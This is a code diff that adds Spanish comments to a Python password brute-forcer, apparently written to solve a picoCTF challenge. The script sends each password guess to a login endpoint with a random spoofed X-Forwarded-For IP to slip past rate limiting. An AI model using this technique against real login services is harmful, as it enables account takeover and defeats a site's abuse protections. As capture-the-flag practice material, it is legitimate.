@@ -1,15 +1,17 @@
 import os, random, requests, argparse
 
 def create_false_ip():
+    # Generamos las IPs falsas de forma dinámica
     return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
 
 def cracker(url, headers, data):
     # Realizamos la petición POST con la IP falsificada y la contraseña en cuestión
     r = requests.post(url=url, headers=headers, data=data)
-
+    
     if r.status_code == 429:
         return "429"
     try:
+        # Se intenta sacar el JSON de la respuesta y se verifica si la contraseña es correcta
         datos = r.json()
         success = datos.get("success", "No especificada")
         if success == True: return True
@@ -21,6 +23,7 @@ def cracker(url, headers, data):
         exit()
 
 def anadir_passwords_fallidos(password):
+    # En el caso muy extraño de que se repita alguna IP y nos devuelvan un código 429, se añaden las contraseñas a un nuevo diccionario para que se puedan probar más tarde
     with open('Contraseñas fallidas.txt', 'a') as f:
         f.write(password + "\n")
 
@@ -46,9 +49,11 @@ def main(url, passwords):
             password = password.strip()
             ip = create_false_ip()
             print(f'[~] Probando contraseña: {password}, con la IP: {ip}')
+            # Creamos la cabecera X-Forwarded-For
             header = {
                 "X-Forwarded-For":ip
             }
+            # Especificamos el body de la petición POST
             data = {
                 "email":"ctf-player@picoctf.org",
                 "password":password
